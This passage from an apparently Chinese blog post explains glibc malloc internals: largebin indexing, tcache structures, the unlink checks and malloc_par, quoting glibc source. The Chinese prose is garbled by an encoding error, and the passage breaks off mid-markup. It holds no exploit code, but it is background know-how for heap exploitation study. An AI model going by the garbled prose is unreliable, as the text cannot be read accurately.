class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> largebin_index(sz) \</span><br><span class="hljs-meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span><br><span class="hljs-meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span><br><span class="hljs-meta">   : largebin_index_32 (sz))</span><br></code></pre></td></tr></table></figure>



<p><img src="Heap.assets/image-20221018154602605.png" srcset="/img/loading.gif" lazyload alt="image-20221018154602605"></p>
<p>largebinsæ˜¯ä¸€ä¸ªåŒé“¾çš„å¾ªç¯åˆ—è¡¨é›†åˆï¼Œæ¯ä¸ªåˆ—è¡¨éƒ½æœ‰ä¸€å®šèŒƒå›´å†…çš„ç©ºé—²å—ã€‚æ¯ä¸ª arena æœ‰63ä¸ª bigbinsï¼Œæ¯ä¸ª large binè´Ÿè´£å®¹çº³å¤§å°ä¸º0x400ä»¥ä¸Šçš„ç©ºé—²å—ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ª0x400çš„ large binå­˜æ”¾å¤§å°åœ¨ 0x400-0x430ä¹‹é—´çš„ç©ºé—²å—ï¼Œè€Œä¸€ä¸ª0x2000çš„ large binå­˜æ”¾å¤§å°åœ¨0x2000-0x21f0ä¹‹é—´çš„å—ã€‚</p>
<p>æ¯ä¸ªå¤§binçš„å¤´éƒ¨éƒ½åœ¨å®ƒçš„arenaä¸­ï¼Œå°½ç®¡å…¶ä¸­çš„åç»­å—ä¹‹é—´çš„é“¾æ¥æ˜¯é€šè¿‡å†…è”å­˜å‚¨ã€‚å½“æ’åºå‘ç”Ÿæ—¶ï¼Œè‡ªç”±å—åªé€šè¿‡å…¶ç«æŠ€åœºçš„unsorted biné“¾æ¥åˆ°å…¶ç›¸åº”çš„ large binã€‚</p>
<p>large bin æ˜¯æŒ‰å¤§å°é¡ºåºç»´æŠ¤çš„ï¼Œè¯¥ binä¸­æœ€å¤§çš„å—å¯ä»¥é€šè¿‡binçš„fdæŒ‡é’ˆè®¿é—®ï¼Œæœ€å°çš„å—å¯ä»¥é€šè¿‡ bk è®¿é—®ã€‚å½“ä¸€ä¸ªå—è¢«é“¾æ¥åˆ°ä¸€ä¸ªlaege binæ—¶ï¼Œå…¶ç”¨æˆ·æ•°æ®çš„ç¬¬ä¸€ä¸ªå››å­—èŠ‚è¢«é‡æ–°ç”¨ä½œå‰å‘æŒ‡é’ˆï¼ˆfd ï¼‰ï¼Œç¬¬äºŒä¸ªå››å­—èŠ‚è¢«é‡æ–°ç”¨ä½œåå‘æŒ‡é’ˆï¼ˆbkï¼‰ã€‚</p>
<p>ç¬¬ä¸€ä¸ªè¢«é“¾æ¥åˆ° largebin çš„å¤§å°çš„å—ï¼Œå…¶ç”¨æˆ·æ•°æ®çš„ç¬¬ä¸‰ä¸ªå’Œç¬¬å››ä¸ªå››å­—è¢«é‡æ–°ç”¨ä½œè·³è¿‡åˆ—è¡¨æŒ‡é’ˆï¼Œ åˆ†åˆ«æ˜¯fd_nextsizeå’Œbk_nextsizeã€‚è¿™äº›nextsizeæŒ‡é’ˆå½¢æˆäº†å¦ä¸€ä¸ªåŒé“¾æ¥çš„å¾ªç¯åˆ—è¡¨ï¼Œå…¶ä¸­åŒ…å«äº†é“¾æ¥åˆ°è¯¥binçš„æ¯ä¸ªå¤§å°çš„ç¬¬ä¸€ä¸ªå—ã€‚ä¸€æ—¦å…¶å¤§å°çš„ç¬¬ä¸€ä¸ªå—è¢«é“¾æ¥åˆ°ä¸€ä¸ªlaege binä¸­ï¼Œéšåçš„ç›¸åŒå¤§å°çš„å—è¢«æ·»åŠ åˆ°è¯¥å¤§å°çš„ç¬¬ä¸€ä¸ªå—ä¹‹åï¼Œä»¥é¿å…é‡æ–°è·¯ç”±è·³è¿‡åˆ—è¡¨ã€‚</p>
<p>åœ¨è¯·æ±‚æœŸé—´ï¼Œåœ¨unsorted binæ‰«æä¹‹åï¼Œä½†åœ¨binmapæœç´¢ä¹‹å‰ï¼Œå¯¹å¤§å°ä¸º0x400åŠä»¥ä¸Šçš„å—è¿›è¡Œ large bin çš„æœç´¢ã€‚åœ¨ large binæœç´¢è¿‡ç¨‹ä¸­ï¼Œmallocç¡®ä¿é€‚å½“çš„binæ‹¥æœ‰è¶³å¤Ÿå¤§çš„å—æ¥æ”¯æŒè¯·æ±‚ï¼›å¦‚æœæ˜¯è¿™æ ·ï¼Œåˆ™ä»åå¾€å‰æ‰«æbinï¼Œå¯»æ‰¾ä¸€ä¸ªå®Œå…¨åˆé€‚æˆ–æ›´å¤§çš„å—ã€‚å½“å®ƒæ˜¯å…¶å¤§å°çš„æœ€åä¸€ä¸ªå—ï¼Œmallocå°±åˆ†é…æŒæœ‰è·³è¿‡åˆ—è¡¨æŒ‡é’ˆçš„å—ï¼Œå¦åˆ™å®ƒå°±åˆ†é…è·³è¿‡å—ä¹‹åçš„ç›¸åŒå¤§å°çš„å—ï¼Œè¿™å°±é¿å…äº†é¢‘ç¹åœ°é‡æ–°è·¯ç”±è·³è¿‡åˆ—è¡¨ã€‚</p>
<p>ä»»ä½•æ¥è‡ª large bin çš„éç²¾ç¡®æ‹Ÿåˆåˆ†é…éƒ½ä¼šè¢«è€—å°½æˆ–å‰©ä½™ï¼Œä½†last_remainderå­—æ®µä¸ä¼šè¢«è®¾ç½®ã€‚</p>
<h3 id="tcache-bin"><a href="#tcache-bin" class="headerlink" title="tcache bin"></a>tcache bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_MAX_BINS		64</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MAX_TCACHE_SIZE	tidx2usize (TCACHE_MAX_BINS-1)</span><br><br><span class="hljs-comment">/* Only used to pre-fill the tunables.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> tidx2usize(idx)	(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><br><span class="hljs-comment">/* When &quot;x&quot; is from chunksize().  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="hljs-comment">/* When &quot;x&quot; is a user-provided size.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span><br><br><span class="hljs-comment">/* With rounding and alignment, the bins are...</span><br><span class="hljs-comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span><br><span class="hljs-comment">   idx 1   bytes 25..40 or 13..20</span><br><span class="hljs-comment">   idx 2   bytes 41..56 or 21..28</span><br><span class="hljs-comment">   etc.  */</span><br><br><span class="hljs-comment">/* This is another arbitrary limit, which tunables can change.  Each</span><br><span class="hljs-comment">   tcache bin will hold at most this number of chunks.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_FILL_COUNT 7</span><br><br><span class="hljs-comment">/* Maximum chunks in tcache bins for tunables.  This value must fit the range</span><br><span class="hljs-comment">   of tcache-&gt;counts[] entries, else they may overflow.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MAX_TCACHE_COUNT UINT16_MAX</span><br></code></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-comment">// 2.27</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125; tcache_entry;<br><br><span class="hljs-comment">// &gt;= 2.29</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-type">uintptr_t</span> key;<br>&#125; tcache_entry;<br><br><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-comment">// 2.27</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-comment">// &gt;= 2.30</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">uint16_t</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br></code></pre></td></tr></table></figure>

<p>åœ¨GLIBCä¸»ç‰ˆæœ¬&gt;=2.26ä¸­ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½è¢«åˆ†é…äº†è‡ªå·±çš„ç»“æ„ï¼Œç§°ä¸ºtcacheï¼Œæˆ–çº¿ç¨‹ç¼“å­˜ã€‚tcache çš„è¡Œä¸ºå°±åƒä¸€ä¸ª arenaï¼Œä½†ä¸ arena ä¸åŒçš„æ˜¯ï¼Œtcacheä¸åœ¨çº¿ç¨‹ä¹‹é—´å…±äº«ã€‚å®ƒä»¬æ˜¯é€šè¿‡åœ¨å±äºçº¿ç¨‹ arena çš„å †ä¸Šåˆ†é…ç©ºé—´æ¥åˆ›å»ºçš„ï¼Œå¹¶åœ¨çº¿ç¨‹é€€å‡ºæ—¶è¢«é‡Šæ”¾ã€‚tcacheçš„ç›®çš„æ˜¯ç¼“è§£çº¿ç¨‹å¯¹mallocèµ„æºçš„äº‰å¤ºï¼Œç»™æ¯ä¸ªçº¿ç¨‹æä¾›è‡ªå·±çš„å—çš„é›†åˆï¼Œä¸ä¸ä½¿ç”¨åŒä¸€ arena çš„å…¶ä»–çº¿ç¨‹å…±äº« ã€‚ ä¸€ä¸ªç¼“å­˜çš„å½¢å¼æ˜¯ä¸€ä¸ªtcache_perthread_structï¼Œå¦‚ä¸‹å›¾11æ‰€ç¤ºï¼Œå®ƒæŒæœ‰64ä¸ªtcachebinsçš„å¤´éƒ¨ ï¼Œå‰é¢æ˜¯ä¸€ä¸ªè®¡æ•°å™¨é˜µåˆ—ï¼Œè®°å½•äº†æ¯ä¸ªtcachebinä¸­ç©ºé—²å—çš„æ•°é‡ã€‚</p>
<p><img src="Heap.assets/image-20221020184215951.png" srcset="/img/loading.gif" lazyload alt="image-20221020184215951"></p>
<p>åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€ä¸ªtcacheæŒæœ‰å¤§å°ä¸º0x20-0x410ï¼ˆå«ï¼‰ çš„å—ã€‚è¿™äº›tcachebinsçš„è¡Œä¸ºä¸fastbinsç±»ä¼¼ï¼Œæ¯ä¸ªtcachebinséƒ½æ˜¯ä¸€ä¸ªå•é“¾çš„ã€éå¾ªç¯çš„ç‰¹å®šå¤§å°çš„ç©ºé—²å—åˆ—è¡¨çš„å¤´éƒ¨ã€‚countsæ•°ç»„çš„ç¬¬ä¸€ä¸ªæ¡ç›®è®°å½•äº†é“¾æ¥åˆ°0x20 tcachebinçš„ç©ºé—²å—çš„ æ•°é‡ï¼Œç¬¬äºŒä¸ªæ¡ç›®è·Ÿè¸ª0x30 tcachebinï¼Œç­‰ç­‰ã€‚</p>
<p>åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œtcachebinå¯ä»¥å®¹çº³çš„ç©ºé—²å—çš„æ•°é‡æ˜¯æœ‰é™åˆ¶çš„ï¼Œè¿™ä¸ªæ•°å­—åœ¨malloc_parç»“æ„ä¸­ çš„tcache_countå­—æ®µä¸­ã€‚å½“tcachebinçš„è®¡æ•°è¾¾åˆ°è¿™ä¸ªé™åˆ¶æ—¶ï¼Œè¯¥binå¤§å°çš„ç©ºé—²å—å°±ä¼šè¢«å½“ä½œæ²¡æœ‰tcacheçš„æƒ…å†µä¸‹å¤„ç†ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ0x20 tcachebinå·²ç»æ»¡äº†ï¼ˆå®ƒæŒæœ‰7ä¸ªç©ºé—²å—ï¼‰ï¼Œä¸‹ä¸€ä¸ª 0x20å¤§å°çš„å—å°†è¢«é‡Šæ”¾åˆ°0x20 fastbinä¸­ã€‚Mallocä½¿ç”¨tcacheçš„countsæ•°ç»„æ¥ç¡®å®šbinæ˜¯å¦å·²æ»¡ã€‚</p>
<p>åœ¨GLIBCç‰ˆæœ¬&gt;=2.29ä¸­ï¼Œé“¾æ¥åˆ°tcachebinçš„ç©ºé—²å—ç¬¬äºŒä¸ªçš„å››å­—èŠ‚è¢«é‡æ–°åˆ©ç”¨ä¸º â€œkey â€œå­—æ®µï¼Œç”¨äºæ£€æµ‹doubleæƒ…å†µã€‚åœ¨GLIBC 2.34ä¹‹å‰ï¼Œtcacheçš„keyå­—æ®µæŒæœ‰å…¶tcacheçš„åœ°å€ï¼Œ2.34åŠä»¥åçš„ç‰ˆæœ¬ä½¿ç”¨ä¸€ä¸ªéšæœºå€¼ã€‚</p>
<p><img src="Heap.assets/image-20221020221315361.png" srcset="/img/loading.gif" lazyload alt="image-20221020221315361"></p>
<p>tcache fd æŒ‡é’ˆä½¿ç”¨æŒ‡å‘ç”¨æˆ·æ•°æ®è€Œä¸æ˜¯å—çš„å…ƒæ•°æ®ã€‚</p>
<h3 id="bin-dependent"><a href="#bin-dependent" class="headerlink" title="bin dependent"></a>bin dependent</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* addressing -- note that bin_at(0) does not exist */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> bin_at(m, i) \</span><br><span class="hljs-meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))			      \</span><br><span class="hljs-meta">             - offsetof (struct malloc_chunk, fd))</span><br><br><span class="hljs-comment">/* analog of ++bin */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> next_bin(b)  ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))</span><br><br><span class="hljs-comment">/* Reminders about list directionality within bins */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> first(b)     ((b)-&gt;fd)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> last(b)      ((b)-&gt;bk)</span><br><br><span class="hljs-comment">/* Take a chunk off a bin list */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span><br><span class="hljs-meta">      malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);                  \</span><br><span class="hljs-meta">    FD = P-&gt;fd;                                      \</span><br><span class="hljs-meta">    BK = P-&gt;bk;                                      \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))              \</span><br><span class="hljs-meta">      malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list&quot;</span>);                  \</span><br><span class="hljs-meta">    <span class="hljs-keyword">else</span> &#123;                                      \</span><br><span class="hljs-meta">        FD-&gt;bk = BK;                                  \</span><br><span class="hljs-meta">        BK-&gt;fd = FD;                                  \</span><br><span class="hljs-meta">        <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))                  \</span><br><span class="hljs-meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;              \</span><br><span class="hljs-meta">        		<span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)          \</span><br><span class="hljs-meta">        			|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="hljs-meta">          				malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span><br><span class="hljs-meta">            	<span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;                      \</span><br><span class="hljs-meta">                	<span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)                      \</span><br><span class="hljs-meta">                 		FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              \</span><br><span class="hljs-meta">               		<span class="hljs-keyword">else</span> &#123;                                  \</span><br><span class="hljs-meta">                        FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                  \</span><br><span class="hljs-meta">                        FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                  \</span><br><span class="hljs-meta">                        P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                  \</span><br><span class="hljs-meta">                        P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                  \</span><br><span class="hljs-meta">                  	&#125;                                  \</span><br><span class="hljs-meta">               &#125; <span class="hljs-keyword">else</span> &#123;                                  \</span><br><span class="hljs-meta">               		P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;              \</span><br><span class="hljs-meta">                	P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;              \</span><br><span class="hljs-meta">               &#125;                                      \</span><br><span class="hljs-meta">          &#125;                                      \</span><br><span class="hljs-meta">      &#125;                                          \</span><br><span class="hljs-meta">&#125;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">unlink_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br><br>  mchunkptr fd = p-&gt;fd;<br>  mchunkptr bk = p-&gt;bk;<br><br>  <span class="hljs-keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="hljs-number">0</span>))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list&quot;</span>);<br><br>  fd-&gt;bk = bk;<br>  bk-&gt;fd = fd;<br>  <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p<br>	  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)<br>	malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>);<br><br>      <span class="hljs-keyword">if</span> (fd-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>)<br>	&#123;<br>	  <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize == p)<br>	    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;<br>	  <span class="hljs-keyword">else</span><br>	    &#123;<br>	      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>	      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>	      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;<br>	      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;<br>	    &#125;<br>	&#125;<br>      <span class="hljs-keyword">else</span><br>	&#123;<br>	  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>	  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>	&#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="alignment-dependent"><a href="#alignment-dependent" class="headerlink" title="alignment dependent"></a>alignment dependent</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* Check if m has acceptable alignment */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> misaligned_chunk(p) \</span><br><span class="hljs-meta">  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \</span><br><span class="hljs-meta">   &amp; MALLOC_ALIGN_MASK)</span><br></code></pre></td></tr></table></figure>



<h3 id="malloc-par"><a href="#malloc-par" class="headerlink" title="malloc_par"></a>malloc_par</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Tunable parameters */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> trim_threshold;<br>  INTERNAL_SIZE_T top_pad;<br>  INTERNAL_SIZE_T mmap_threshold;<br>  INTERNAL_SIZE_T arena_test;<br>  INTERNAL_SIZE_T arena_max;<br><br>  <span class="hljs-comment">/* Memory map support */</span><br>  <span class="hljs-type">int</span> n_mmaps;<br>  <span class="hljs-type">int</span> n_mmaps_max;<br>  <span class="hljs-type">int</span> max_n_mmaps;<br>  <span class="hljs-comment">/* the mmap_threshold is dynamic, until the user sets</span><br><span class="hljs-comment">     it manually, at which point we need to disable any</span><br><span class="hljs-comment">     dynamic behavior. */</span><br>  <span class="hljs-type">int</span> no_dyn_threshold;<br><br>  <span class="hljs-comment">/* Statistics */</span><br>  INTERNAL_SIZE_T mmapped_mem;<br>  INTERNAL_SIZE_T max_mmapped_mem;<br><br>  <span class="hljs-comment">/* First address handed out by MORECORE/sbrk.  */</span><br>  <span class="hljs-type">char</span> *sbrk_base;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* Maximum number of buckets to use.  */</span><br>  <span class="hljs-type">size_t</span> tcache_bins;<br>  <span class="hljs-type">size_t</span> tcache_max_bytes;<br>  <span class="hljs-comment">/* Maximum number of chunks in each bucket.  */</span><br>  <span class="hljs-type">size_t</span> tcache_count;<br>  <span class="hljs-comment">/* Maximum number of chunks to remove from the unsorted list, which</span><br><span class="hljs-comment">     aren&#x27;t used to prefill the cache.  */</span><br>  <span class="hljs-type">size_t</span> tcache_unsorted_limit;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br><br><span class="hljs-comment">/* There is only one instance of the malloc parameters.  */</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> <span class="hljs-title">mp_</span> =</span><br>&#123;<br>  .top_pad = DEFAULT_TOP_PAD,<br>  .n_mmaps_max = DEFAULT_MMAP_MAX,<br>  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,<br>  .trim_threshold = DEFAULT_TRIM_THRESHOLD,<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span><br>  .arena_test = NARENAS_FROM_NCORES (<span class="hljs-number">1</span>)<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  ,<br>  .tcache_count = TCACHE_FILL_COUNT,<br>  .tcache_bins = TCACHE_MAX_BINS,<br>  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="hljs-number">-1</span>),<br>  .tcache_unsorted_limit = <span class="hljs-number">0</span> <span class="hljs-comment">/* No limit.  */</span><br><span class="hljs-meta">#<span 